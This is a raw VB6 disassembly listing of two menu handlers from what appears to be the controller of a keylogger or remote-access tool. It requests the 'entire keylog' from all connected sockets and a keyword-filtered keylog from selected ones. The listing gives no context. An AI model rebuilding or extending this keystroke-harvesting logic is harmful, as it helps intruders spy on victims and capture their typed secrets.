0074F2BB: push 00000000h
0074F2BD: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
0074F2C2: ret 
End Sub

Private sub mnuHelLoggAlla__74BE2E
0074BE2E: push ebp
0074BE2F: mov ebp, esp
0074BE31: sub esp, 00000018h
0074BE34: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0074BE39: mov eax, fs:[00h]
0074BE3F: push eax
0074BE40: mov fs:[00000000h], esp
0074BE47: mov eax, 00000104h
0074BE4C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074BE51: push ebx
0074BE52: push esi
0074BE53: push edi
0074BE54: mov var_18, esp
0074BE57: mov var_14, 00405B98h
0074BE5E: mov eax, [ebp+08h]
0074BE61: and eax, 00000001h
0074BE64: mov var_10, eax
0074BE67: mov eax, [ebp+08h]
0074BE6A: and al, FEh
0074BE6C: mov [ebp+08h], eax
0074BE6F: mov var_0C, 00000000h
0074BE76: mov eax, [ebp+08h]
0074BE79: mov eax, [eax]
0074BE7B: push [ebp+08h]
0074BE7E: call [eax+04h]
0074BE81: mov var_04, 00000001h
0074BE88: mov var_04, 00000002h
0074BE8F: push FFFFFFFFh
0074BE91: call 00410A60h ; On Error ...
0074BE96: mov var_04, 00000004h
0074BE9D: mov var_6C, 00000001h
0074BEA4: mov var_74, 00000002h
0074BEAB: push 004412BCh
0074BEB0: push 00000000h
0074BEB2: push 00000007h
0074BEB4: mov eax, [ebp+08h]
0074BEB7: mov eax, [eax]
0074BEB9: push [ebp+08h]
0074BEBC: call [eax+0000032Ch]
0074BEC2: push eax
0074BEC3: lea eax, var_38
0074BEC6: push eax
0074BEC7: call 00410A84h ; Set (object)
0074BECC: push eax
0074BECD: lea eax, var_50
0074BED0: push eax
0074BED1: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074BED6: add esp, 00000010h
0074BED9: push eax
0074BEDA: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074BEDF: push eax
0074BEE0: lea eax, var_3C
0074BEE3: push eax
0074BEE4: call 00410A84h ; Set (object)
0074BEE9: mov var_000000A0, eax
0074BEEF: lea eax, var_0000009C
0074BEF5: push eax
0074BEF6: mov eax, var_000000A0
0074BEFC: mov eax, [eax]
0074BEFE: push var_000000A0
0074BF04: call [eax+1Ch]
0074BF07: fclex 
0074BF09: mov var_000000A4, eax
0074BF0F: cmp var_000000A4, 00000000h
0074BF16: jnl 74BF38h
0074BF18: push 0000001Ch
0074BF1A: push 004412BCh
0074BF1F: push var_000000A0
0074BF25: push var_000000A4
0074BF2B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074BF30: mov var_00000110, eax
0074BF36: jmp 74BF3Fh
0074BF38: and var_00000110, 00000000h
0074BF3F: mov eax, var_0000009C
0074BF45: mov var_7C, eax
0074BF48: mov var_00000084, 00000003h
0074BF52: mov var_0000008C, 00000001h
0074BF5C: mov var_00000094, 00000002h
0074BF66: lea eax, var_74
0074BF69: push eax
0074BF6A: lea eax, var_00000084
0074BF70: push eax
0074BF71: lea eax, var_00000094
0074BF77: push eax
0074BF78: lea eax, var_000000D0
0074BF7E: push eax
0074BF7F: lea eax, var_000000C0
0074BF85: push eax
0074BF86: lea eax, var_30
0074BF89: push eax
0074BF8A: call 00410A3Ch ; For
0074BF8F: mov var_00000108, eax
0074BF95: lea eax, var_3C
0074BF98: push eax
0074BF99: lea eax, var_38
0074BF9C: push eax
0074BF9D: push 00000002h
0074BF9F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074BFA4: add esp, 0000000Ch
0074BFA7: lea ecx, var_50
0074BFAA: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074BFAF: jmp 0074C1EEh
0074BFB4: mov var_04, 00000005h
0074BFBB: push 004412BCh
0074BFC0: push 00000000h
0074BFC2: push 00000007h
0074BFC4: mov eax, [ebp+08h]
0074BFC7: mov eax, [eax]
0074BFC9: push [ebp+08h]
0074BFCC: call [eax+0000032Ch]
0074BFD2: push eax
0074BFD3: lea eax, var_38
0074BFD6: push eax
0074BFD7: call 00410A84h ; Set (object)
0074BFDC: push eax
0074BFDD: lea eax, var_50
0074BFE0: push eax
0074BFE1: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074BFE6: add esp, 00000010h
0074BFE9: push eax
0074BFEA: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074BFEF: push eax
0074BFF0: lea eax, var_3C
0074BFF3: push eax
0074BFF4: call 00410A84h ; Set (object)
0074BFF9: mov var_000000A0, eax
0074BFFF: lea eax, var_40
0074C002: push eax
0074C003: lea eax, var_30
0074C006: push eax
0074C007: mov eax, var_000000A0
0074C00D: mov eax, [eax]
0074C00F: push var_000000A0
0074C015: call [eax+24h]
0074C018: fclex 
0074C01A: mov var_000000A4, eax
0074C020: cmp var_000000A4, 00000000h
0074C027: jnl 74C049h
0074C029: push 00000024h
0074C02B: push 004412BCh
0074C030: push var_000000A0
0074C036: push var_000000A4
0074C03C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074C041: mov var_00000114, eax
0074C047: jmp 74C050h
0074C049: and var_00000114, 00000000h
0074C050: mov eax, var_40
0074C053: mov var_000000A8, eax
0074C059: lea eax, var_34
0074C05C: push eax
0074C05D: push 00000005h
0074C05F: mov eax, var_000000A8
0074C065: mov eax, [eax]
0074C067: push var_000000A8
0074C06D: call [eax+00000084h]
0074C073: fclex 
0074C075: mov var_000000AC, eax
0074C07B: cmp var_000000AC, 00000000h
0074C082: jnl 74C0A7h
0074C084: push 00000084h
0074C089: push 004412DCh
0074C08E: push var_000000A8
0074C094: push var_000000AC
0074C09A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074C09F: mov var_00000118, eax
0074C0A5: jmp 74C0AEh
0074C0A7: and var_00000118, 00000000h
0074C0AE: push var_34
0074C0B1: push 0044BAE4h ; 100%
0074C0B6: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0074C0BB: neg eax
0074C0BD: sbb eax, eax
0074C0BF: inc eax
0074C0C0: neg eax
0074C0C2: mov var_000000B0, ax
0074C0C9: lea ecx, var_34
0074C0CC: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074C0D1: lea eax, var_40
0074C0D4: push eax
0074C0D5: lea eax, var_3C
0074C0D8: push eax
0074C0D9: lea eax, var_38
0074C0DC: push eax
0074C0DD: push 00000003h
0074C0DF: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074C0E4: add esp, 00000010h
0074C0E7: lea ecx, var_50
0074C0EA: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074C0EF: movsx eax, word ptr var_000000B0
0074C0F6: test eax, eax
0074C0F8: jz 0074C1CAh
0074C0FE: mov var_04, 00000006h
0074C105: push 004412BCh
0074C10A: push 00000000h
0074C10C: push 00000007h
0074C10E: mov eax, [ebp+08h]
0074C111: mov eax, [eax]
0074C113: push [ebp+08h]
0074C116: call [eax+0000032Ch]
0074C11C: push eax
0074C11D: lea eax, var_38
0074C120: push eax
0074C121: call 00410A84h ; Set (object)
0074C126: push eax
0074C127: lea eax, var_50
0074C12A: push eax
0074C12B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074C130: add esp, 00000010h
0074C133: push eax
0074C134: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074C139: push eax
0074C13A: lea eax, var_3C
0074C13D: push eax
0074C13E: call 00410A84h ; Set (object)
0074C143: mov var_000000A0, eax
0074C149: lea edx, var_30
0074C14C: lea ecx, var_60
0074C14F: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
0074C154: lea eax, var_60
0074C157: push eax
0074C158: mov eax, var_000000A0
0074C15E: mov eax, [eax]
0074C160: push var_000000A0
0074C166: call [eax+34h]
0074C169: fclex 
0074C16B: mov var_000000A4, eax
0074C171: cmp var_000000A4, 00000000h
0074C178: jnl 74C19Ah
0074C17A: push 00000034h
0074C17C: push 004412BCh
0074C181: push var_000000A0
0074C187: push var_000000A4
0074C18D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074C192: mov var_0000011C, eax
0074C198: jmp 74C1A1h
0074C19A: and var_0000011C, 00000000h
0074C1A1: lea eax, var_3C
0074C1A4: push eax
0074C1A5: lea eax, var_38
0074C1A8: push eax
0074C1A9: push 00000002h
0074C1AB: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074C1B0: add esp, 0000000Ch
0074C1B3: lea eax, var_60
0074C1B6: push eax
0074C1B7: lea eax, var_50
0074C1BA: push eax
0074C1BB: push 00000002h
0074C1BD: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074C1C2: add esp, 0000000Ch
0074C1C5: jmp 0074BE96h
0074C1CA: mov var_04, 00000009h
0074C1D1: lea eax, var_000000D0
0074C1D7: push eax
0074C1D8: lea eax, var_000000C0
0074C1DE: push eax
0074C1DF: lea eax, var_30
0074C1E2: push eax
0074C1E3: call 00410A36h ; Next
0074C1E8: mov var_00000108, eax
0074C1EE: cmp var_00000108, 00000000h
0074C1F5: jnz 0074BFB4h
0074C1FB: mov var_04, 0000000Ah
0074C202: and [008F23B8h], 00000000h
0074C209: mov var_04, 0000000Bh
0074C210: fldz 
0074C212: fstp real8 ptr [008F23BCh]
0074C218: mov var_04, 0000000Ch
0074C21F: fldz 
0074C221: fstp real8 ptr [008F23ACh]
0074C227: mov var_04, 0000000Dh
0074C22E: push 00FF00FFh
0074C233: push 0044BB60h ; Entire log - All sockets
0074C238: push 00442864h ; Keylog
0074C23D: push 00443C28h
0074C242: call 0074FC42h
0074C247: mov var_04, 0000000Eh
0074C24E: mov var_6C, 00000001h
0074C255: mov var_74, 00000002h
0074C25C: cmp [008F2010h], 00000000h
0074C263: jnz 74C280h
0074C265: push 008F2010h
0074C26A: push 00433984h
0074C26F: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074C274: mov var_00000120, 008F2010h
0074C27E: jmp 74C28Ah
0074C280: mov var_00000120, 008F2010h
0074C28A: mov eax, var_00000120
0074C290: mov eax, [eax]
0074C292: mov ecx, var_00000120
0074C298: mov ecx, [ecx]
0074C29A: mov ecx, [ecx]
0074C29C: push eax
0074C29D: call [ecx+00000524h]
0074C2A3: push eax
0074C2A4: lea eax, var_38
0074C2A7: push eax
0074C2A8: call 00410A84h ; Set (object)
0074C2AD: mov var_000000A0, eax
0074C2B3: lea eax, var_00000098
0074C2B9: push eax
0074C2BA: mov eax, var_000000A0
0074C2C0: mov eax, [eax]
0074C2C2: push var_000000A0
0074C2C8: call [eax+48h]
0074C2CB: fclex 
0074C2CD: mov var_000000A4, eax
0074C2D3: cmp var_000000A4, 00000000h
0074C2DA: jnl 74C2FCh
0074C2DC: push 00000048h
0074C2DE: push 00440DE8h
0074C2E3: push var_000000A0
0074C2E9: push var_000000A4
0074C2EF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074C2F4: mov var_00000124, eax
0074C2FA: jmp 74C303h
0074C2FC: and var_00000124, 00000000h
0074C303: mov ax, var_00000098
0074C30A: mov var_7C, ax
0074C30E: mov var_00000084, 00000002h
0074C318: mov var_0000008C, 00000001h
0074C322: mov var_00000094, 00000002h
0074C32C: lea eax, var_74
0074C32F: push eax
0074C330: lea eax, var_00000084
0074C336: push eax
0074C337: lea eax, var_00000094
0074C33D: push eax
0074C33E: lea eax, var_000000F0
0074C344: push eax
0074C345: lea eax, var_000000E0
0074C34B: push eax
0074C34C: lea eax, var_30
0074C34F: push eax
0074C350: call 00410A3Ch ; For
0074C355: mov var_0000010C, eax
0074C35B: lea ecx, var_38
0074C35E: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0074C363: jmp 0074C3F1h
0074C368: mov var_04, 0000000Fh
0074C36F: push 00000000h
0074C371: push FFFFFFFFh
0074C373: push 00000000h
0074C375: push 00000000h
0074C377: lea eax, var_64
0074C37A: push eax
0074C37B: push 00000010h
0074C37D: push 00000880h
0074C382: call 00410946h ; ReDim
0074C387: add esp, 0000001Ch
0074C38A: mov edx, 0043D540h ; x25
0074C38F: lea ecx, var_34
0074C392: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0074C397: lea eax, var_64
0074C39A: push eax
0074C39B: lea eax, var_34
0074C39E: push eax
0074C39F: lea eax, var_30
0074C3A2: push eax
0074C3A3: call 004109D0h ; msvbvm60.dll.__vbaI2Var
0074C3A8: push eax
0074C3A9: call 007A6910h
0074C3AE: lea eax, var_64
0074C3B1: push eax
0074C3B2: push 00000000h
0074C3B4: call 00410934h ; Erase
0074C3B9: lea ecx, var_34
0074C3BC: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074C3C1: mov var_04, 00000010h
0074C3C8: call 0041096Ah ; DoEvents
0074C3CD: mov var_04, 00000011h
0074C3D4: lea eax, var_000000F0
0074C3DA: push eax
0074C3DB: lea eax, var_000000E0
0074C3E1: push eax
0074C3E2: lea eax, var_30
0074C3E5: push eax
0074C3E6: call 00410A36h ; Next
0074C3EB: mov var_0000010C, eax
0074C3F1: cmp var_0000010C, 00000000h
0074C3F8: jnz 0074C368h
0074C3FE: mov var_10, 00000000h
0074C405: wait 
0074C406: push 0074C478h
0074C40B: jmp 74C449h
0074C40D: lea ecx, var_34
0074C410: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074C415: lea eax, var_40
0074C418: push eax
0074C419: lea eax, var_3C
0074C41C: push eax
0074C41D: lea eax, var_38
0074C420: push eax
0074C421: push 00000003h
0074C423: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074C428: add esp, 00000010h
0074C42B: lea eax, var_60
0074C42E: push eax
0074C42F: lea eax, var_50
0074C432: push eax
0074C433: push 00000002h
0074C435: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074C43A: add esp, 0000000Ch
0074C43D: lea eax, var_64
0074C440: push eax
0074C441: push 00000000h
0074C443: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
0074C448: ret 
End Sub

Private sub mnuFiltreradLoggMarkerade__74CD6E
0074CD6E: push ebp
0074CD6F: mov ebp, esp
0074CD71: sub esp, 00000018h
0074CD74: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0074CD79: mov eax, fs:[00h]
0074CD7F: push eax
0074CD80: mov fs:[00000000h], esp
0074CD87: mov eax, 000001B0h
0074CD8C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074CD91: push ebx
0074CD92: push esi
0074CD93: push edi
0074CD94: mov var_18, esp
0074CD97: mov var_14, 00405C70h
0074CD9E: mov eax, [ebp+08h]
0074CDA1: and eax, 00000001h
0074CDA4: mov var_10, eax
0074CDA7: mov eax, [ebp+08h]
0074CDAA: and al, FEh
0074CDAC: mov [ebp+08h], eax
0074CDAF: mov var_0C, 00000000h
0074CDB6: mov eax, [ebp+08h]
0074CDB9: mov eax, [eax]
0074CDBB: push [ebp+08h]
0074CDBE: call [eax+04h]
0074CDC1: mov var_04, 00000001h
0074CDC8: mov var_04, 00000002h
0074CDCF: push FFFFFFFFh
0074CDD1: call 00410A60h ; On Error ...
0074CDD6: mov var_04, 00000003h
0074CDDD: mov var_000000BC, 80020004h
0074CDE7: mov var_000000C4, 0000000Ah
0074CDF1: mov var_000000AC, 80020004h
0074CDFB: mov var_000000B4, 0000000Ah
0074CE05: mov var_0000009C, 80020004h
0074CE0F: mov var_000000A4, 0000000Ah
0074CE19: mov var_0000008C, 80020004h
0074CE23: mov var_00000094, 0000000Ah
0074CE2D: mov var_7C, 80020004h
0074CE34: mov var_00000084, 0000000Ah
0074CE3E: mov var_000000E0, 0044BA4Ch ; Filtered keylog
0074CE48: mov var_000000E8, 00000008h
0074CE52: lea edx, var_000000E8
0074CE58: lea ecx, var_74
0074CE5B: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074CE60: mov var_000000D0, 0044BA38h ; Keyword
0074CE6A: mov var_000000D8, 00000008h
0074CE74: lea edx, var_000000D8
0074CE7A: lea ecx, var_64
0074CE7D: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074CE82: lea eax, var_000000C4
0074CE88: push eax
0074CE89: lea eax, var_000000B4
0074CE8F: push eax
0074CE90: lea eax, var_000000A4
0074CE96: push eax
0074CE97: lea eax, var_00000094
0074CE9D: push eax
0074CE9E: lea eax, var_00000084
0074CEA4: push eax
0074CEA5: lea eax, var_74
0074CEA8: push eax
0074CEA9: lea eax, var_64
0074CEAC: push eax
0074CEAD: call 00410994h ; InputBox
0074CEB2: mov edx, eax
0074CEB4: mov ecx, 008F23B4h
0074CEB9: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074CEBE: lea eax, var_000000C4
0074CEC4: push eax
0074CEC5: lea eax, var_000000B4
0074CECB: push eax
0074CECC: lea eax, var_000000A4
0074CED2: push eax
0074CED3: lea eax, var_00000094
0074CED9: push eax
0074CEDA: lea eax, var_00000084
0074CEE0: push eax
0074CEE1: lea eax, var_74
0074CEE4: push eax
0074CEE5: lea eax, var_64
0074CEE8: push eax
0074CEE9: push 00000007h
0074CEEB: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074CEF0: add esp, 00000020h
0074CEF3: mov var_04, 00000004h
0074CEFA: mov var_000000BC, 80020004h
0074CF04: mov var_000000C4, 0000000Ah
0074CF0E: mov var_000000AC, 80020004h
0074CF18: mov var_000000B4, 0000000Ah
0074CF22: mov var_0000009C, 80020004h
0074CF2C: mov var_000000A4, 0000000Ah
0074CF36: mov var_0000008C, 80020004h
0074CF40: mov var_00000094, 0000000Ah
0074CF4A: mov var_7C, 80020004h
0074CF51: mov var_00000084, 0000000Ah
0074CF5B: mov var_000000E0, 0044BA4Ch ; Filtered keylog
0074CF65: mov var_000000E8, 00000008h
0074CF6F: lea edx, var_000000E8
0074CF75: lea ecx, var_74
0074CF78: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074CF7D: mov var_000000D0, 0044BA70h ; Total number of charactes to include after the keyword
0074CF87: mov var_000000D8, 00000008h
0074CF91: lea edx, var_000000D8
0074CF97: lea ecx, var_64
0074CF9A: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074CF9F: lea eax, var_000000C4
0074CFA5: push eax
0074CFA6: lea eax, var_000000B4
0074CFAC: push eax
0074CFAD: lea eax, var_000000A4
0074CFB3: push eax
0074CFB4: lea eax, var_00000094
0074CFBA: push eax
0074CFBB: lea eax, var_00000084
0074CFC1: push eax
0074CFC2: lea eax, var_74
0074CFC5: push eax
0074CFC6: lea eax, var_64
0074CFC9: push eax
0074CFCA: call 00410994h ; InputBox
0074CFCF: mov edx, eax
0074CFD1: lea ecx, var_38
0074CFD4: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074CFD9: push eax
0074CFDA: call 004109DCh ; Val(arg_1)
0074CFDF: call 00410814h ; msvbvm60.dll.__vbaFpI4
0074CFE4: mov var_34, eax
0074CFE7: lea ecx, var_38
0074CFEA: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074CFEF: lea eax, var_000000C4
0074CFF5: push eax
0074CFF6: lea eax, var_000000B4
0074CFFC: push eax
0074CFFD: lea eax, var_000000A4
0074D003: push eax
0074D004: lea eax, var_00000094
0074D00A: push eax
0074D00B: lea eax, var_00000084
0074D011: push eax
0074D012: lea eax, var_74
0074D015: push eax
0074D016: lea eax, var_64
0074D019: push eax
0074D01A: push 00000007h
0074D01C: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074D021: add esp, 00000020h
0074D024: mov var_04, 00000006h
0074D02B: mov var_000000D0, 00000001h
0074D035: mov var_000000D8, 00000002h
0074D03F: push 004412BCh
0074D044: push 00000000h
0074D046: push 00000007h
0074D048: mov eax, [ebp+08h]
0074D04B: mov eax, [eax]
0074D04D: push [ebp+08h]
0074D050: call [eax+0000032Ch]
0074D056: push eax
0074D057: lea eax, var_4C
0074D05A: push eax
0074D05B: call 00410A84h ; Set (object)
0074D060: push eax
0074D061: lea eax, var_64
0074D064: push eax
0074D065: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074D06A: add esp, 00000010h
0074D06D: push eax
0074D06E: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074D073: push eax
0074D074: lea eax, var_50
0074D077: push eax
0074D078: call 00410A84h ; Set (object)
0074D07D: mov var_00000148, eax
0074D083: lea eax, var_0000013C
0074D089: push eax
0074D08A: mov eax, var_00000148
0074D090: mov eax, [eax]
0074D092: push var_00000148
0074D098: call [eax+1Ch]
0074D09B: fclex 
0074D09D: mov var_0000014C, eax
0074D0A3: cmp var_0000014C, 00000000h
0074D0AA: jnl 74D0CCh
0074D0AC: push 0000001Ch
0074D0AE: push 004412BCh
0074D0B3: push var_00000148
0074D0B9: push var_0000014C
0074D0BF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074D0C4: mov var_000001B8, eax
0074D0CA: jmp 74D0D3h
0074D0CC: and var_000001B8, 00000000h
0074D0D3: mov eax, var_0000013C
0074D0D9: mov var_000000E0, eax
0074D0DF: mov var_000000E8, 00000003h
0074D0E9: mov var_000000F0, 00000001h
0074D0F3: mov var_000000F8, 00000002h
0074D0FD: lea eax, var_000000D8
0074D103: push eax
0074D104: lea eax, var_000000E8
0074D10A: push eax
0074D10B: lea eax, var_000000F8
0074D111: push eax
0074D112: lea eax, var_00000178
0074D118: push eax
0074D119: lea eax, var_00000168
0074D11F: push eax
0074D120: lea eax, var_30
0074D123: push eax
0074D124: call 00410A3Ch ; For
0074D129: mov var_000001B0, eax
0074D12F: lea eax, var_50
0074D132: push eax
0074D133: lea eax, var_4C
0074D136: push eax
0074D137: push 00000002h
0074D139: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074D13E: add esp, 0000000Ch
0074D141: lea ecx, var_64
0074D144: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074D149: jmp 0074D388h
0074D14E: mov var_04, 00000007h
0074D155: push 004412BCh
0074D15A: push 00000000h
0074D15C: push 00000007h
0074D15E: mov eax, [ebp+08h]
0074D161: mov eax, [eax]
0074D163: push [ebp+08h]
0074D166: call [eax+0000032Ch]
0074D16C: push eax
0074D16D: lea eax, var_4C
0074D170: push eax
0074D171: call 00410A84h ; Set (object)
0074D176: push eax
0074D177: lea eax, var_64
0074D17A: push eax
0074D17B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074D180: add esp, 00000010h
0074D183: push eax
0074D184: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074D189: push eax
0074D18A: lea eax, var_50
0074D18D: push eax
0074D18E: call 00410A84h ; Set (object)
0074D193: mov var_00000148, eax
0074D199: lea eax, var_54
0074D19C: push eax
0074D19D: lea eax, var_30
0074D1A0: push eax
0074D1A1: mov eax, var_00000148
0074D1A7: mov eax, [eax]
0074D1A9: push var_00000148
0074D1AF: call [eax+24h]
0074D1B2: fclex 
0074D1B4: mov var_0000014C, eax
0074D1BA: cmp var_0000014C, 00000000h
0074D1C1: jnl 74D1E3h
0074D1C3: push 00000024h
0074D1C5: push 004412BCh
0074D1CA: push var_00000148
0074D1D0: push var_0000014C
0074D1D6: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074D1DB: mov var_000001BC, eax
0074D1E1: jmp 74D1EAh
0074D1E3: and var_000001BC, 00000000h
0074D1EA: mov eax, var_54
0074D1ED: mov var_00000150, eax
0074D1F3: lea eax, var_38
0074D1F6: push eax
0074D1F7: push 00000005h
0074D1F9: mov eax, var_00000150
0074D1FF: mov eax, [eax]
0074D201: push var_00000150
0074D207: call [eax+00000084h]
0074D20D: fclex 
0074D20F: mov var_00000154, eax
0074D215: cmp var_00000154, 00000000h
0074D21C: jnl 74D241h
0074D21E: push 00000084h
0074D223: push 004412DCh
0074D228: push var_00000150
0074D22E: push var_00000154
0074D234: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074D239: mov var_000001C0, eax
0074D23F: jmp 74D248h
0074D241: and var_000001C0, 00000000h
0074D248: push var_38
0074D24B: push 0044BAE4h ; 100%
0074D250: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0074D255: neg eax
0074D257: sbb eax, eax
0074D259: inc eax
0074D25A: neg eax
0074D25C: mov var_00000158, ax
0074D263: lea ecx, var_38
0074D266: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074D26B: lea eax, var_54
0074D26E: push eax
0074D26F: lea eax, var_50
0074D272: push eax
0074D273: lea eax, var_4C
0074D276: push eax
0074D277: push 00000003h
0074D279: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074D27E: add esp, 00000010h
0074D281: lea ecx, var_64
0074D284: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074D289: movsx eax, word ptr var_00000158
0074D290: test eax, eax
0074D292: jz 0074D364h
0074D298: mov var_04, 00000008h
0074D29F: push 004412BCh
0074D2A4: push 00000000h
0074D2A6: push 00000007h
0074D2A8: mov eax, [ebp+08h]
0074D2AB: mov eax, [eax]
0074D2AD: push [ebp+08h]
0074D2B0: call [eax+0000032Ch]
0074D2B6: push eax
0074D2B7: lea eax, var_4C
0074D2BA: push eax
0074D2BB: call 00410A84h ; Set (object)
0074D2C0: push eax
0074D2C1: lea eax, var_64
0074D2C4: push eax
0074D2C5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074D2CA: add esp, 00000010h
0074D2CD: push eax
0074D2CE: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074D2D3: push eax
0074D2D4: lea eax, var_50
0074D2D7: push eax
0074D2D8: call 00410A84h ; Set (object)
0074D2DD: mov var_00000148, eax
0074D2E3: lea edx, var_30
0074D2E6: lea ecx, var_74
0074D2E9: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
0074D2EE: lea eax, var_74
0074D2F1: push eax
0074D2F2: mov eax, var_00000148
0074D2F8: mov eax, [eax]
0074D2FA: push var_00000148
0074D300: call [eax+34h]
0074D303: fclex 
0074D305: mov var_0000014C, eax
0074D30B: cmp var_0000014C, 00000000h
0074D312: jnl 74D334h
0074D314: push 00000034h
0074D316: push 004412BCh
0074D31B: push var_00000148
0074D321: push var_0000014C
0074D327: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074D32C: mov var_000001C4, eax
0074D332: jmp 74D33Bh
0074D334: and var_000001C4, 00000000h
0074D33B: lea eax, var_50
0074D33E: push eax
0074D33F: lea eax, var_4C
0074D342: push eax
0074D343: push 00000002h
0074D345: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074D34A: add esp, 0000000Ch
0074D34D: lea eax, var_74
0074D350: push eax
0074D351: lea eax, var_64
0074D354: push eax
0074D355: push 00000002h
0074D357: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074D35C: add esp, 0000000Ch
0074D35F: jmp 0074D024h
0074D364: mov var_04, 0000000Bh
0074D36B: lea eax, var_00000178
0074D371: push eax
0074D372: lea eax, var_00000168
0074D378: push eax
0074D379: lea eax, var_30
0074D37C: push eax
0074D37D: call 00410A36h ; Next
0074D382: mov var_000001B0, eax
0074D388: cmp var_000001B0, 00000000h
0074D38F: jnz 0074D14Eh
0074D395: mov var_04, 0000000Ch
0074D39C: and [008F23B8h], 00000000h
0074D3A3: mov var_04, 0000000Dh
0074D3AA: fldz 
0074D3AC: fstp real8 ptr [008F23BCh]
0074D3B2: mov var_04, 0000000Eh
0074D3B9: fldz 
0074D3BB: fstp real8 ptr [008F23ACh]
0074D3C1: mov var_04, 0000000Fh
0074D3C8: push [008F23B4h]
0074D3CE: push 00000000h
0074D3D0: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0074D3D5: test eax, eax
0074D3D7: jnz 74D3DEh
0074D3D9: jmp 0074D91Ch
0074D3DE: mov var_04, 00000012h
0074D3E5: cmp var_34, 00000000h
0074D3E9: jnle 74D3F0h
0074D3EB: jmp 0074D91Ch
0074D3F0: mov var_04, 00000015h
0074D3F7: push 00FF00FFh
0074D3FC: push 0044BC00h ; Filtered log (
0074D401: push [008F23B4h]
0074D407: call 00410A18h ; &
0074D40C: mov edx, eax
0074D40E: lea ecx, var_38
0074D411: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074D416: push eax
0074D417: push 004496A8h
0074D41C: call 00410A18h ; &
0074D421: mov edx, eax
0074D423: lea ecx, var_3C
0074D426: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074D42B: push eax
0074D42C: push var_34
0074D42F: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
0074D434: mov edx, eax
0074D436: lea ecx, var_40
0074D439: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074D43E: push eax
0074D43F: call 00410A18h ; &
0074D444: mov edx, eax
0074D446: lea ecx, var_44
0074D449: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074D44E: push eax
0074D44F: push 0044BC24h ; ) - Selected sockets
0074D454: call 00410A18h ; &
0074D459: mov edx, eax
0074D45B: lea ecx, var_48
0074D45E: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074D463: push eax
0074D464: push 00442864h ; Keylog
0074D469: push 0044A82Ch
0074D46E: call 0074FC42h
0074D473: lea eax, var_48
0074D476: push eax
0074D477: lea eax, var_44
0074D47A: push eax
0074D47B: lea eax, var_40
0074D47E: push eax
0074D47F: lea eax, var_3C
0074D482: push eax
0074D483: lea eax, var_38
0074D486: push eax
0074D487: push 00000005h
0074D489: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074D48E: add esp, 00000018h
0074D491: mov var_04, 00000016h
0074D498: mov var_000000D0, 00000001h
0074D4A2: mov var_000000D8, 00000002h
0074D4AC: cmp [008F2010h], 00000000h
0074D4B3: jnz 74D4D0h
